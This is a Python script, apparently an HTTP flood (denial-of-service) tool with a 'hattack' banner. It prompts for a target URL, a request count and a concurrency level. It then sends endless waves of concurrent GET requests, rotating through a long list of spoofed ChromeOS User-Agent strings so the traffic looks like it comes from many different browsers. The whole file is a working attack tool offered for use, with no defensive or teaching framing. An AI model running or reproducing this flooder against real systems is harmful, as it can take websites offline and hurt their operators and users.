#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import random
import os
import datetime

class UI:
    RESET  = "\033[0m"
    RED    = "\033[31m"
    GREEN  = "\033[32m"
    YELLOW = "\033[33m"
    BLUE   = "\033[34m"
    CYAN   = "\033[36m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"

USER_AGENTS = [
    "Mozilla/5.0 (X11; CrOS x86_64 10575.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10032.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.140 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10718.88.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.118 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10176.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.190 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8350.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10895.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.95 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10032.75.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10895.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.120 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9000.91.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9765.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.123 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9202.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.146 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10452.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10575.55.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8530.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.154 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9460.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.91 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10452.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9460.73.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.134 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 11021.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.76 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9460.73.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.134 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10452.99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.203 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9765.81.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.120 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7390.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.82 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.62.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7262.57.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.98 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9901.66.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.82 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7647.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9592.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.112 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9334.72.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.140 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8530.81.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8743.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.101 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10176.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.144 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10718.71.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.87 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10323.62.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.184 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8872.73.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10575.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7520.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7834.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7978.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 6310.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.96 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10575.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.101 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9000.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9202.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7390.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10176.72.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7834.66.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.111 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7520.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7647.73.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.92 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7834.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.95 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9592.94.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10452.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.137 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8530.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.154 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 7262.57.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.98 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9592.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.80 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 7390.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.82 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10032.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.140 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10032.75.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10718.88.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.118 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8172.62.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 4731.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.67 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8350.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.85 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8350.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8743.83.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.93 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 9202.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.146 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 7647.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7978.66.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.91 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 9460.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.113 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 10323.67.6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10176.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.190 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8350.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.85 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8530.93.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.144 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 9460.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.91 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.47.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 8172.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7647.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 9000.91.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 5116.115.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7647.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.88 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36",
]

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    print(rf"""
{UI.CYAN}{UI.BOLD}

.__            __    __                 __    
|  |__ _____ _/  |__/  |______    ____ |  | __
|  |  \\__  \\   __\   __\__  \ _/ ___\|  |/ /
|   Y  \/ __ \|  |  |  |  / __ \\  \___|    < 
|___|  (____  /__|  |__| (____  /\___  >__|_ \
     \/     \/                \/     \/     \/

{UI.RESET}
""")

def get_timestamp():
    return datetime.datetime.now().strftime("%H:%M:%S")

def get_user_input():
    clear_screen()
    print_banner()

    print(f"{UI.YELLOW}[Configuration]{UI.RESET}")
    print(f"{UI.DIM}Examples: requests=1000 | concurrency=100{UI.RESET}\n")

    timestamp = get_timestamp()
    print(f"{UI.CYAN}[{timestamp}]{UI.RESET} Starting configuration...\n")

    target_url = input(
        f"{UI.GREEN}› Target URL            {UI.DIM}(e.g. https://example.com){UI.RESET} : "
    ).strip()

    if not target_url.startswith("http"):
        print(f"{UI.RED}[ERROR]{UI.RESET} URL must start with http:// or https://")
        exit()

    try:
        total_requests = int(
            input(
                f"{UI.GREEN}› Total requests        {UI.DIM}(e.g. 1000){UI.RESET} : "
            )
        )
        concurrent_requests = int(
            input(
                f"{UI.GREEN}› Concurrent connections{UI.DIM}(e.g. 100){UI.RESET} : "
            )
        )
    except ValueError:
        print(f"{UI.RED}[ERROR]{UI.RESET} Values must be numeric")
        exit()

    print(f"""
{UI.BLUE}────────────────────────────────────────────────────
 Target URL   : {target_url}
 Requests     : {total_requests}
 Concurrency  : {concurrent_requests}
────────────────────────────────────────────────────
{UI.RESET}
""")

    return target_url, total_requests, concurrent_requests

async def send_request(session, url):
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        async with session.get(url, headers=headers) as response:
            timestamp = f"{UI.CYAN}{get_timestamp()}{UI.RESET}"
            print(
                f"{UI.GREEN}[OK]{UI.RESET} "
                f"[{timestamp}] Status: {response.status}"
            )
    except Exception as e:
        timestamp = f"{UI.CYAN}{get_timestamp()}{UI.RESET}"
        print(
            f"{UI.RED}[FAIL]{UI.RESET} "
            f"[{timestamp}] {type(e).__name__}: {e}"
        )

async def main():
    clear_screen()
    target_url, total_requests, concurrent_requests = get_user_input()

    connector = aiohttp.TCPConnector(limit=concurrent_requests)
    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:
        while True:
            tasks = [
                send_request(session, target_url)
                for _ in range(total_requests)
            ]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
